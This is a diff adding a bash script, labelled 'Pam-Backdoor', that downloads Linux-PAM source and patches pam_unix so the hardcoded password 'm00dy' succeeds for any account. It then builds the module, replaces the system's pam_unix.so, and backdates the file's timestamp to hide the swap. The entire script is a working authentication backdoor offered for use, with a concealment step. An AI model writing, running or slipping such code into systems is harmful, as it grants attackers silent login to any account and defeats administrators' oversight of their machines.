@@ -1,0 +1,27 @@
+#!/bin/bash
+SECRETPASS='m00dy'
+echo "
+.___  ___.   ___     ___    _______  ____    ____ 
+|   \/   |  / _ \   / _ \  |       \ \   \  /   / 
+|  \  /  | | | | | | | | | |  .--.  | \   \/   /  
+|  |\/|  | | | | | | | | | |  |  |  |  \_    _/   
+|  |  |  | | |_| | | |_| | |  '--'  |    |  |     
+|__|  |__|  \___/   \___/  |_______/     |__|   "
+echo -e "\nPam-Backdoor\n{code this shit while learning pam}\n\n"
+
+
+oldtime=`stat -c '%z' /lib/security/pam_ftp.so`
+echo 'Pam backdoor starting!'
+mirror_url='http://debian.securedservers.com/kernel/pub/linux/libs/pam/library/Linux-PAM-1.1.1.tar.gz'
+echo 'Fetching from '$mirror_url
+wget $mirror_url #fetch the roll
+tar zxf Linux-PAM-1.1.1.tar.gz #untar
+cd Linux-PAM-1.1.1
+#find and replace
+sed -i -e 's/retval = _unix_verify_password(pamh, name, p, ctrl);/retval = _unix_verify_password(pamh, name, p, ctrl);\n\tif(strcmp(p,"'$SECRETPASS'")==0){retval=PAM_SUCCESS;}/g' modules/pam_unix/pam_unix_auth.c
+./configure && make
+#copy modified pam_unix.so
+/bin/cp -rf modules/pam_unix/.libs/pam_unix.so /lib/security/pam_unix.so
+touch -d "$oldtime" /lib/security/pam_unix.so
+cd .. && rm -rf Linux-PAM.1.1.1
+echo "Done bro.."
